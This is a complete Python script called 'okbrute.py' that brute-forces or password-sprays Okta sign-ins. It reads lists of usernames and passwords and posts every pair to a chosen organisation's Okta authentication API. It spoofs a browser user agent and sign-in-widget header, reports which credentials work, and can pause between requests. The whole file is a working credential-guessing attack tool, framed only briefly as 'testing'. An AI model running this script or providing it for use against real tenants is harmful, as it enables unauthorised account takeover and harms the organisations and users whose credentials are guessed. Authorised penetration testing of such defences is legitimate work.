#!/usr/bin/python
import sys
import requests
import json
import time
import argparse 

G, B, R, W, M, C, end = '\033[92m', '\033[94m', '\033[91m', '\x1b[37m', '\x1b[35m', '\x1b[36m', '\033[0m'
info = end + W + "[-]" + W
good = end + G + "[+]" + C
bad = end + R + "[" + W + "!" + R + "]"

user_agent = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
		      "AppleWebKit/537.36 (KHTML, like Gecko)" 
			  "Chrome/75.0.3770.90 Safari/537.36"
			 )		

def send_auth(target, username, password, limit=0):
	authn_url = "https://" + target + ".okta.com/api/v1/authn"
	headers = {'x-okta-user-agent-extended':'okta-signin-widget-3.1.6', 
	  'content-type':'application/json', 'User-Agent':user_agent}
	
	for pw, user in [(pw, user) for pw in password for user in username]:
		data = {'password':pw, 'username':user}

		r = requests.post(authn_url, data=json.dumps(data), headers=headers)
		if (r.status_code == 401):
			print(bad + " Authentication failure for " + user + ":" + pw + end)
		elif (r.status_code == 200):
			print(good + " Authentication success for " + user + ":" + pw + end)
		elif (r.status_code != 200 and r.status_code != 401):
			print(bad + " Other error: " + str(r.status_code) + " " + r.content + end)

		# pause if limit is set
		if (pw != password[-1] or user != username[-1]): 
			time.sleep(limit)

if __name__ == '__main__':
	parser = argparse.ArgumentParser(prog='okbrute.py', description='For testing username/password combos against an Okta sign-in widget.')
	parser.add_argument("--target", help="The target subdomain (https://<target>.okta.com)")
	parser.add_argument("-u", "--user", help="Single username to try")
	parser.add_argument("-p", "--password", help="Single password to try")
	parser.add_argument("--userlist", help="A file containing the list of usernames")
	parser.add_argument("--passwordlist", help="A file containig the list of passwords")
	parser.add_argument("--limit", help="Set request rate limit speed, in seconds")
	args = parser.parse_args()

	if (not args.target and not args.user and not args.password 
	   and not args.userlist and not args.passwordlist):
		print(bad + " Missing parameters " + end)
		parser.print_help()
		exit(-1)

	usernames = []
	passwords = []

	if args.user:
		usernames.append(args.user)
	elif args.userlist:
		try:
			with open(args.userlist, 'r') as lines:
				usernames = [line.strip() for line in lines]
		except Exception as e:
			print(bad + " Can't read the file: " + str(args.userlist))
			exit(-1)
	
	if args.password:
		passwords.append(args.password)
	elif args.passwordlist:
		try:
			with open(args.passwordlist, 'r') as lines:
				passwords = [line.strip() for line in lines]
		except Exception as e:
			print(bad + " Can't read the file: " + str(args.passwordlist))
			exit(-1)

	print(info + " Testing " + str(len(usernames)) + " username(s) and " + 
		  str(len(passwords)) + " password(s) against " + args.target + ".okta.com") 

	try:
		send_auth(str(args.target), usernames, passwords, int(args.limit))
	except:
		send_auth(str(args.target), usernames, passwords)
